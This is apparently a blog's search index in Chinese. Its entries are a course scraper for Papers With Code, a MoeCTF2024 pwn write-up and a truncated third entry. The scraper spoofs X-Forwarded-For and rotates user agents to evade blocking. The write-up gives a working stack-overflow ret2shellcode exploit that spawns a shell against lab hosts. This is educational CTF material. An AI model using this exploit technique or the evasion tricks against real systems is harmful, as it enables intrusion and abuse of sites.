<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>基于request库和re库的爬虫实战</title>
      <link href="/2025/03/07/%E5%9F%BA%E4%BA%8Erequest%E5%BA%93%E5%92%8Cre%E5%BA%93%E7%9A%84%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98/"/>
      <url>/2025/03/07/%E5%9F%BA%E4%BA%8Erequest%E5%BA%93%E5%92%8Cre%E5%BA%93%E7%9A%84%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p><strong>某个实验课的任务，目标是从论文数据库爬取500篇论文</strong></p><p><strong>爬取网站：<a href="https://paperswithcode.com/">The latest in Machine Learning | Papers With Code</a></strong></p><p><strong>关键字：LLM evaluation</strong></p><blockquote><p><em>老师给的源代码DrissionPage库，很赞很好用，就是太慢了。</em></p><p><em>一时兴起打算用request库+re库自己搓一个爬虫</em></p><p><em>正则虐我千百遍，我待正则如初恋</em>😋</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment">#随机UA，这是模拟类人行为的一部分</span></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Opera/8.0 (Windows NT 5.1; U; en)&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#先去扒几个免费代理ip</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_iplist</span>():</span><br><span class="line">    url = <span class="string">&#x27;https://www.89ip.cn/&#x27;</span></span><br><span class="line">    html = requests.get(url).text</span><br><span class="line"></span><br><span class="line">    ip_list=[]</span><br><span class="line"></span><br><span class="line">    trs = re.findall(<span class="string">r&#x27;&lt;tr&gt;(.*?)&lt;/tr&gt;&#x27;</span>,html,re.S)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> trs:</span><br><span class="line">        <span class="comment">#print(tr)</span></span><br><span class="line">        <span class="comment">#获取ip和端口</span></span><br><span class="line">        td = re.findall(<span class="string">r&#x27;&lt;td&gt;.*?(\d+\.\d+\.\d+\.\d+|\d+).*?&lt;/td&gt;&#x27;</span>,tr,re.S)</span><br><span class="line">        <span class="keyword">if</span> td:</span><br><span class="line">            ip = <span class="string">f&quot;<span class="subst">&#123;td[<span class="number">0</span>]&#125;</span>:<span class="subst">&#123;td[<span class="number">1</span>]&#125;</span>&quot;</span></span><br><span class="line">            <span class="comment">#print(ip)</span></span><br><span class="line">            ip_list.append(ip)</span><br><span class="line">    <span class="keyword">return</span> ip_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_headers</span>(<span class="params">ip_list,USER_AGENTS</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#随机选取ip和UA,类人群星闪耀</span></span><br><span class="line">    ip = random.choice(ip_list)</span><br><span class="line">    UA = random.choice(USER_AGENTS)</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>:ip ,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:UA </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">work</span>():</span><br><span class="line"></span><br><span class="line">    ip_list = get_iplist()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    base_url = <span class="string">&#x27;https://paperswithcode.com&#x27;</span></span><br><span class="line">    init_url = <span class="string">&#x27;https://paperswithcode.com/search?q_meta=&amp;q_type=&amp;q=LLM+evaluation&#x27;</span></span><br><span class="line">    href_list = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">86</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\033[93m[+]正在爬取第<span class="subst">&#123;i&#125;</span>页\033[0m&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">1.5</span>)</span><br><span class="line"></span><br><span class="line">        page_url = <span class="string">f&#x27;<span class="subst">&#123;init_url&#125;</span>&amp;page=<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = Get_headers(ip_list,USER_AGENTS)</span><br><span class="line">            text = requests.get(page_url,headers=headers).text</span><br><span class="line"></span><br><span class="line">            <span class="comment">#print(text)</span></span><br><span class="line">            divs = re.findall(<span class="string">r&#x27;&lt;div class=&quot;row infinite-item item paper-card&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>,text,re.S)</span><br><span class="line">            <span class="keyword">for</span> div <span class="keyword">in</span> divs:</span><br><span class="line">                <span class="comment">#print(div)</span></span><br><span class="line">                href = re.findall(<span class="string">r&#x27;&lt;a href=&quot;(.*?)&quot;&gt;&#x27;</span>,div,re.S)</span><br><span class="line">                <span class="comment">#print(href)</span></span><br><span class="line">                <span class="keyword">if</span> href:</span><br><span class="line">                    href_list.append(<span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span><span class="subst">&#123;href[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\033[91m[-]第<span class="subst">&#123;i&#125;</span>页爬取失败！\033[0m&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(href_list)</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="built_in">len</span>(href_list)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;\033[95m[+]爬取url完成！获得url数量为<span class="subst">&#123;<span class="built_in">sum</span>&#125;</span>个\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    csv_headers = [<span class="string">&#x27;标题&#x27;</span>,<span class="string">&#x27;摘要&#x27;</span>,<span class="string">&#x27;方法&#x27;</span>,<span class="string">&#x27;作者&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;B:\\Desktop\\2025_Cource_assistant\\paperswitchcode_lib.csv&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>,newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        writer = csv.writer(f)</span><br><span class="line">        writer.writerow(csv_headers)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> href <span class="keyword">in</span> href_list:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\033[93m[+]正在处理<span class="subst">&#123;href&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line">            <span class="built_in">sum</span>-=<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\033[95m[+]剩余<span class="subst">&#123;<span class="built_in">sum</span>&#125;</span>篇论文\033[0m&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">1.5</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">                headers = Get_headers(ip_list,USER_AGENTS)</span><br><span class="line">                text = requests.get(href,headers=headers).text</span><br><span class="line"></span><br><span class="line">                res = []</span><br><span class="line">                <span class="comment">#获取论文标题</span></span><br><span class="line">                title = re.findall(<span class="string">r&#x27;&lt;div class=&quot;paper-title&quot;&gt;.*?&lt;h1&gt;(.*?)&lt;/h1&gt;&#x27;</span>,text,re.S)[<span class="number">0</span>].strip()</span><br><span class="line">                <span class="comment">#print(title)</span></span><br><span class="line">                <span class="keyword">if</span> title:</span><br><span class="line">                    res.append(title)</span><br><span class="line">                <span class="keyword">else</span>:   </span><br><span class="line">                    res.append(<span class="string">&#x27;获取标题失败&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment">#获取论文摘要</span></span><br><span class="line">                abstract = re.findall(<span class="string">r&#x27;&lt;div class=&quot;paper-abstract&quot;&gt;.*?&lt;p&gt;(.*?)&lt;/p&gt;&#x27;</span>,text,re.S)[<span class="number">0</span>].strip()</span><br><span class="line">                <span class="comment">#print(abstract)</span></span><br><span class="line">                <span class="keyword">if</span> abstract:</span><br><span class="line">                    res.append(abstract)</span><br><span class="line">                <span class="keyword">else</span>:   </span><br><span class="line">                    res.append(<span class="string">&#x27;获取摘要失败&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment">#获取Method</span></span><br><span class="line">                method_div = re.findall(<span class="string">r&#x27;&lt;div class=&quot;method-section&quot; id=&quot;methods&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>,text,re.S)[<span class="number">0</span>]</span><br><span class="line">                methods_raw = re.findall(<span class="string">r&#x27;&lt;a href=&quot;/method/.*?&gt;(.*?)&lt;/a&gt;&#x27;</span>,method_div,re.S)</span><br><span class="line">                methods = [re.sub(<span class="string">r&#x27;^\s+|\s+$&#x27;</span>, <span class="string">&#x27;&#x27;</span>, item) <span class="keyword">for</span> item <span class="keyword">in</span> methods_raw]</span><br><span class="line">                <span class="comment">#print(methods)</span></span><br><span class="line">                <span class="keyword">if</span> methods :</span><br><span class="line">                    res.append(<span class="string">&#x27;,&#x27;</span>.join(methods))</span><br><span class="line">                <span class="keyword">else</span>:   </span><br><span class="line">                    res.append(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment">#获取论文作者</span></span><br><span class="line">                authors = re.findall(<span class="string">r&#x27;&lt;span class=&quot;author-span&quot;&gt;.*?&lt;a href.*?&gt;(.*?)&lt;/a&gt;&#x27;</span>,text,re.S)</span><br><span class="line">                <span class="comment">#print(authors)</span></span><br><span class="line">                <span class="keyword">if</span> authors:</span><br><span class="line">                    res.append(<span class="string">&#x27;,&#x27;</span>.join(authors))</span><br><span class="line">                <span class="keyword">else</span>:   </span><br><span class="line">                    res.append(<span class="string">&#x27;获取作者失败&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment">#print(res)</span></span><br><span class="line">                <span class="keyword">if</span> res:</span><br><span class="line">                    writer.writerow(res)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;\033[91m[-]处理<span class="subst">&#123;href&#125;</span>失败！\033[0m&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    work()</span><br></pre></td></tr></table></figure><script src="https://cdn.jsdelivr.net/npm/echarts@4.8.0/dist/echarts.min.js"></script><script src="https://cdn.jsdelivr.net/npm/echarts-gl@1.1.1/dist/echarts-gl.min.js"></script><script>const data = {  name: 'flare',  children: [    {      name: 'data',      children: [        {          name: 'converters',          children: [            { name: 'Converters', value: 721 },            { name: 'DelimitedTextConverter', value: 4294 }          ]        },        {          name: 'DataUtil',          value: 3322        }      ]    },    {      name: 'display',      children: [        { name: 'DirtySprite', value: 8833 },        { name: 'LineSprite', value: 1732 },        { name: 'RectSprite', value: 3623 }      ]    },    {      name: 'flex',      children: [{ name: 'FlareVis', value: 4116 }]    },    {      name: 'query',      children: [        { name: 'AggregateExpression', value: 1616 },        { name: 'And', value: 1027 },        { name: 'Arithmetic', value: 3891 },        { name: 'Average', value: 891 },        { name: 'BinaryExpression', value: 2893 },        { name: 'Comparison', value: 5103 },        { name: 'CompositeExpression', value: 3677 },        { name: 'Count', value: 781 },        { name: 'DateUtil', value: 4141 },        { name: 'Distinct', value: 933 },        { name: 'Expression', value: 5130 },        { name: 'ExpressionIterator', value: 3617 },        { name: 'Fn', value: 3240 },        { name: 'If', value: 2732 },        { name: 'IsA', value: 2039 },        { name: 'Literal', value: 1214 },        { name: 'Match', value: 3748 },        { name: 'Maximum', value: 843 },        {          name: 'methods',          children: [            { name: 'add', value: 593 },            { name: 'and', value: 330 },            { name: 'average', value: 287 },            { name: 'count', value: 277 },            { name: 'distinct', value: 292 },            { name: 'div', value: 595 },            { name: 'eq', value: 594 },            { name: 'fn', value: 460 },            { name: 'gt', value: 603 },            { name: 'gte', value: 625 },            { name: 'iff', value: 748 },            { name: 'isa', value: 461 },            { name: 'lt', value: 597 },            { name: 'lte', value: 619 },            { name: 'max', value: 283 },            { name: 'min', value: 283 },            { name: 'mod', value: 591 },            { name: 'mul', value: 603 },            { name: 'neq', value: 599 },            { name: 'not', value: 386 },            { name: 'or', value: 323 },            { name: 'orderby', value: 307 },            { name: 'range', value: 772 },            { name: 'select', value: 296 },            { name: 'stddev', value: 363 },            { name: 'sub', value: 600 },            { name: 'sum', value: 280 },            { name: 'update', value: 307 },            { name: 'variance', value: 335 },            { name: 'where', value: 299 },            { name: 'xor', value: 354 },            { name: '_', value: 264 }          ]        },        { name: 'Minimum', value: 843 },        { name: 'Not', value: 1554 },        { name: 'Or', value: 970 },        { name: 'Query', value: 13896 },        { name: 'Range', value: 1594 },        { name: 'StringUtil', value: 4130 },        { name: 'Sum', value: 791 },        { name: 'Variable', value: 1124 },        { name: 'Variance', value: 1876 },        { name: 'Xor', value: 1101 }      ]    },    {      name: 'scale',      children: [        { name: 'IScaleMap', value: 2105 },        { name: 'LinearScale', value: 1316 },        { name: 'LogScale', value: 3151 },        { name: 'OrdinalScale', value: 3770 },        { name: 'QuantileScale', value: 2435 },        { name: 'QuantitativeScale', value: 4839 },        { name: 'RootScale', value: 1756 },        { name: 'Scale', value: 4268 },        { name: 'ScaleType', value: 1821 },        { name: 'TimeScale', value: 5833 }      ]    }  ]};var data2 = {  name: 'flare',  children: [    {      name: 'flex',      children: [{ name: 'FlareVis', value: 4116 }]    },    {      name: 'scale',      children: [        { name: 'IScaleMap', value: 2105 },        { name: 'LinearScale', value: 1316 },        { name: 'LogScale', value: 3151 },        { name: 'OrdinalScale', value: 3770 },        { name: 'QuantileScale', value: 2435 },        { name: 'QuantitativeScale', value: 4839 },        { name: 'RootScale', value: 1756 },        { name: 'Scale', value: 4268 },        { name: 'ScaleType', value: 1821 },        { name: 'TimeScale', value: 5833 }      ]    },    {      name: 'display',      children: [{ name: 'DirtySprite', value: 8833 }]    }  ]};</script><div id="echarts3424" style="width: 90%;height: 500px;margin: 0 auto"></div><script src="https://cdn.bootcss.com/echarts/3.8.0/echarts.common.min.js"></script><script type="text/javascript">        // 基于准备好的dom，初始化echarts实例        var myChart = echarts.init(document.getElementById('echarts3424'));        // 指定图表的配置项和数据        var option = {    tooltip: {      trigger: 'item',      triggerOn: 'mousemove'    },    legend: {      top: '2%',      left: '3%',      orient: 'vertical',      data: [        {          name: 'tree1',          icon: 'rectangle'        },        {          name: 'tree2',          icon: 'rectangle'        }      ],      borderColor: '#c23531'    },    series: [      {        type: 'tree',        name: 'tree1',        data: [data],        top: '5%',        left: '7%',        bottom: '2%',        right: '60%',        symbolSize: 7,        label: {          position: 'left',          verticalAlign: 'middle',          align: 'right'        },        leaves: {          label: {            position: 'right',            verticalAlign: 'middle',            align: 'left'          }        },        emphasis: {          focus: 'descendant'        },        expandAndCollapse: true,        animationDuration: 550,        animationDurationUpdate: 750      },      {        type: 'tree',        name: 'tree2',        data: [data2],        top: '20%',        left: '60%',        bottom: '22%',        right: '18%',        symbolSize: 7,        label: {          position: 'left',          verticalAlign: 'middle',          align: 'right'        },        leaves: {          label: {            position: 'right',            verticalAlign: 'middle',            align: 'left'          }        },        expandAndCollapse: true,        emphasis: {          focus: 'descendant'        },        animationDuration: 550,        animationDurationUpdate: 750      }    ]  };        // 使用刚指定的配置项和数据显示图表。        myChart.setOption(option);</script>]]></content>
      
      
      <categories>
          
          <category> 实验 </category>
          
          <category> 文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2024-WP-Pwn</title>
      <link href="/2025/02/21/MoeCTF2024-WP-Pwn/"/>
      <url>/2025/02/21/MoeCTF2024-WP-Pwn/</url>
      
        <content type="html"><![CDATA[<p>西电链接</p><p><a href="https://ctf.xidian.edu.cn/">西电 CTF 终端</a></p><h1 id="NotEnoughTime"><a href="#NotEnoughTime" class="headerlink" title="NotEnoughTime"></a>NotEnoughTime</h1><p>一个练习使用pwntools的题目</p><p>会输出表达式，而且后台模拟了网络延迟状况，需要使用recvuntil</p><p>recvuntil是接收数据直到某个特点信息，注意设置时要用byte形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span>         <span class="comment">#打开debug可以随时监控都收到了什么字符，以防recvuntil卡住或者遗漏关键信息</span></span><br><span class="line">io = remote(<span class="string">&#x27;192.168.43.76&#x27;</span>,<span class="number">2576</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment">#不知道一共会有多少条，所以暂时先设置一个循环数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>): </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;get:&quot;</span>)</span><br><span class="line">    line = io.recvuntil(<span class="string">b&#x27;=&#x27;</span>).decode()</span><br><span class="line">    <span class="keyword">if</span> line == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span>,line)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> line :   <span class="comment">#不是表达式</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        line = re.sub(<span class="string">&#x27;[a-zA-Z,!.]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,line) <span class="comment">#接收途中会出现进入下一阶段的提示，将其删除以防止其混入表达式</span></span><br><span class="line">        ans=<span class="built_in">eval</span>(line.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;//&#x27;</span>))</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(ans).encode())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;done&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h2><p>看题目就知道是ret2shellcode</p><img src="/2025/02/21/MoeCTF2024-WP-Pwn/sh.png" class=""><p>随意输入一个数字，会得到nbyte的地址</p><p>而且read语句存在栈溢出漏洞</p><p>只需要把shellcode注入到nbyte，然后通过栈溢出把返回地址篡改为nbyte地址即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug != <span class="number">0</span> :</span><br><span class="line">    io = remote(<span class="string">&#x27;172.26.208.1&#x27;</span>,<span class="number">6400</span>)</span><br><span class="line"><span class="keyword">else</span>:   </span><br><span class="line">    io = process(file_name)</span><br><span class="line"></span><br><span class="line">elf=ELF(file_name)</span><br><span class="line"></span><br><span class="line">context(arch=elf.arch)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;1000000&#x27;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="built_in">int</span>(io.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x60</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(padding,<span class="string">b&#x27;a&#x27;</span>) + p64(ret_addr) </span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024NewStarCTF-WP-Web</title>
      <link href="/2024/12/28/2024NewStarCTF-WP-Web/"/>
      <url>/2024/12/28/2024NewStarCTF-WP-Web/</url>
      
